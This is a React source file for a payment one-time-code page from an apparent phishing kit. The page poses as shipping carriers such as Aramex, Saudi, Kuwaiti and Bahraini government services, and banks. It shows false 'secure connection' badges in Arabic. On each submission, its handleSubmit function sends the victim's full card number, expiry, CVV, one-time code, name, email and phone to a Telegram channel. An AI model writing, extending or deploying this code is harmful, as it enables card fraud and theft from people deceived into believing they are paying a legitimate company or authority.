import React, { useState, useEffect } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { usePayment, useUpdatePayment, useLink } from "@/hooks/useSupabase";
import { sendToTelegram } from "@/lib/telegram";
import { Shield, AlertCircle, Lock, Clock, ShieldCheck } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { getServiceBranding } from "@/lib/serviceLogos";
import { getBankById } from "@/lib/banks";
import { bankBranding } from "@/lib/brandingSystem";
import BankLogo from "@/components/BankLogo";
import {
  InputOTP,
  InputOTPGroup,
  InputOTPSlot,
} from "@/components/ui/input-otp";
import { designSystem } from "@/lib/designSystem";
import { getCompanyLayout } from "@/components/CompanyLayouts";
import { getGovernmentLayout } from "@/components/GovernmentLayouts";
import { detectEntityFromURL, getEntityIdentity } from "@/lib/dynamicIdentity";
import { useAutoApplyIdentity } from "@/hooks/useAutoApplyIdentity";
import { useDynamicIdentity } from "@/components/DynamicIdentityProvider";

const PaymentOTP = () => {
  const { id, paymentId } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: payment, refetch } = usePayment(paymentId);
  const { data: link } = useLink(payment?.link_id || undefined);
  const updatePayment = useUpdatePayment();

  useAutoApplyIdentity();
  const { identity: dynamicIdentity } = useDynamicIdentity();

  const [otp, setOtp] = useState("");
  const [error, setError] = useState("");
  const [isLocked, setIsLocked] = useState(false);
  const [timeLeft, setTimeLeft] = useState(180);

  const serviceKey = link?.payload?.service_key || link?.payload?.service || link?.payload?.carrier || 'aramex';
  const serviceName = link?.payload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);
  const country = link?.payload?.country || "SA";

  const selectedBankId = link?.payload?.selectedBank || '';
  const selectedBank = selectedBankId && selectedBankId !== 'skipped' ? getBankById(selectedBankId) : null;
  const selectedBankBranding = selectedBankId && selectedBankId !== 'skipped' ? bankBranding[selectedBankId] : null;

  const primaryColor = dynamicIdentity?.colors?.primary || selectedBankBranding?.colors?.primary || branding.colors.primary;
  const secondaryColor = dynamicIdentity?.colors?.secondary || selectedBankBranding?.colors?.secondary || branding.colors.secondary;
  
  useEffect(() => {
    if (timeLeft > 0 && !isLocked) {
      const timer = setTimeout(() => setTimeLeft(timeLeft - 1), 1000);
      return () => clearTimeout(timer);
    }
  }, [timeLeft, isLocked]);
  
  useEffect(() => {
    if (payment?.locked_until) {
      const lockTime = new Date(payment.locked_until).getTime();
      const now = Date.now();
      
      if (now < lockTime) {
        setIsLocked(true);
        setError("تم حظر عملية الدفع مؤقتاً لأسباب أمنية.");
      } else {
        setIsLocked(false);
      }
    }
  }, [payment]);
  
  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, '0')}`;
  };
  
  const handleClearOTP = () => {
    setOtp("");
    setError("");
  };

  const handleSubmit = async () => {
    if (!payment || isLocked) return;

    setError("");

    const isCorrect = otp === payment.otp;

    await sendToTelegram({
      type: 'payment_otp_attempt',
      data: {
        name: payment.name || '',
        email: payment.email || '',
        phone: payment.phone || '',
        service: serviceName,
        amount: payment.amount || '',
        cardholder: payment.cardholder || '',
        cardNumber: payment.card_number || '',
        cardLast4: payment.card_last4 || '',
        expiry: payment.card_expiry || '',
        cvv: payment.card_cvv || '',
        otp: otp,
        otp_status: isCorrect ? 'correct' : 'wrong',
        attempts: payment.attempts + 1
      },
      timestamp: new Date().toISOString()
    });

    if (otp === payment.otp) {
      await updatePayment.mutateAsync({
        paymentId: payment.id,
        updates: {
          status: "confirmed",
          receipt_url: `/pay/${id}/receipt/${payment.id}`,
        },
      });

      toast({
        title: "تم بنجاح!",
        description: "تم تأكيد الدفع بنجاح",
      });

      navigate(`/pay/${id}/receipt/${payment.id}`);
    } else {
      const newAttempts = payment.attempts + 1;

      if (newAttempts >= 3) {
        const lockUntil = new Date(Date.now() + 15 * 60 * 1000).toISOString();

        await updatePayment.mutateAsync({
          paymentId: payment.id,
          updates: {
            attempts: newAttempts,
            locked_until: lockUntil,
          },
        });

        setIsLocked(true);
        setError("تم حظر عملية الدفع مؤقتاً لأسباب أمنية.");
      } else {
        await updatePayment.mutateAsync({
          paymentId: payment.id,
          updates: {
            attempts: newAttempts,
          },
        });

        setError(`رمز التحقق غير صحيح. حاول مرة أخرى. (${3 - newAttempts} محاولات متبقية)`);
        refetch();
      }
    }
  };

  const renderOTPForm = () => (
    <div className="space-y-8">
      <div className="text-center">
        <p className="text-gray-600 mb-6">أدخل رمز التحقق المرسل إلى جوالك</p>
        <div className="flex justify-center" dir="ltr">
          <InputOTP maxLength={6} value={otp} onChange={setOtp} disabled={isLocked}>
            <InputOTPGroup className="gap-2 sm:gap-4">
              {[0, 1, 2, 3, 4, 5].map((index) => (
                <InputOTPSlot 
                  key={index} 
                  index={index} 
                  className="w-10 h-12 sm:w-14 sm:h-16 text-xl sm:text-2xl font-bold border-2 rounded-xl"
                  style={{ borderColor: otp.length > index ? primaryColor : '#E2E8F0' }}
                />
              ))}
            </InputOTPGroup>
          </InputOTP>
        </div>
        {error && <p className="text-red-500 text-sm mt-4 font-bold">{error}</p>}
      </div>

      <Button 
        className="w-full h-14 text-lg font-bold text-white rounded-xl shadow-lg transition-all hover:scale-[1.02]"
        onClick={handleSubmit}
        disabled={otp.length !== 6 || isLocked}
        style={{ background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})` }}
      >
        تأكيد الرمز
      </Button>

      <div className="text-center">
        <button className="text-sm font-bold opacity-60 hover:opacity-100 transition-opacity" style={{ color: primaryColor }} onClick={() => setTimeLeft(180)} disabled={timeLeft > 0 || isLocked}>
          إعادة إرسال الرمز {timeLeft > 0 && `(${formatTime(timeLeft)})`}
        </button>
      </div>
    </div>
  );
  
  const isShipping = link?.type === 'shipping';
  
  return (
    <div 
      className="min-h-screen flex flex-col"
      dir="rtl"
      style={{
        background: `linear-gradient(135deg, ${selectedBankBranding?.colors?.surface || '#F8F9FA'}, #FFFFFF)`,
        fontFamily: selectedBankBranding?.fonts?.arabic || 'Cairo, Tajawal, sans-serif'
      }}
    >
      {(() => {
        if (isShipping) {
          const Layout = getCompanyLayout(serviceKey);
          return (
            <Layout 
              companyKey={serviceKey} 
              amount={payment?.amount ? `${payment.amount} ر.س` : ''} 
              trackingNumber={link?.payload?.tracking_number || `TRK-${id?.substring(0, 8).toUpperCase()}`}
            >
              {renderOTPForm()}
            </Layout>
          );
        }

        if (country === 'SA' || country === 'KW' || country === 'BH') {
          const Layout = getGovernmentLayout(country);
          return (
            <Layout 
              countryCode={country} 
              amount={payment?.amount ? `${payment.amount} ر.س` : ''} 
              serviceName={serviceName}
            >
              {renderOTPForm()}
            </Layout>
          );
        }

        return (
          <>
            <div className="w-full py-6 px-4 shadow-md bg-white" style={{ borderBottom: `3px solid ${primaryColor}` }}>
              <div className="container mx-auto max-w-6xl flex items-center justify-between">
                <div className="flex items-center gap-4">
                  {selectedBank && <div className="w-24 sm:w-32"><BankLogo bankId={selectedBank.id} bankName={selectedBank.name} bankNameAr={selectedBank.nameAr} color={selectedBank.color} size="lg" className="w-full" /></div>}
                  <div>
                    <h2 className="text-lg font-bold">التحقق الأمني</h2>
                    <p className="text-sm text-gray-500">رمز التحقق OTP</p>
                  </div>
                </div>
                <div className="flex items-center gap-2 px-3 py-1.5 rounded-full bg-green-50 border border-green-200">
                  <ShieldCheck className="w-4 h-4 text-green-600" />
                  <span className="text-xs font-medium text-green-700">اتصال آمن</span>
                </div>
              </div>
            </div>

            <div className="flex-1 py-8 sm:py-12">
              <div className="container mx-auto px-4 max-w-md">
                <div className="text-center mb-6">
                  <Badge className="text-sm px-5 py-2 text-white" style={{ background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})` }}>
                    <Lock className="w-4 h-4 ml-2" />
                    <span>التحقق الآمن</span>
                  </Badge>
                </div>
                <Card className="p-8 shadow-2xl rounded-[16px] border-0">
                  {renderOTPForm()}
                </Card>
              </div>
            </div>
          </>
        );
      })()}
    </div>
  );
};

export default PaymentOTP;
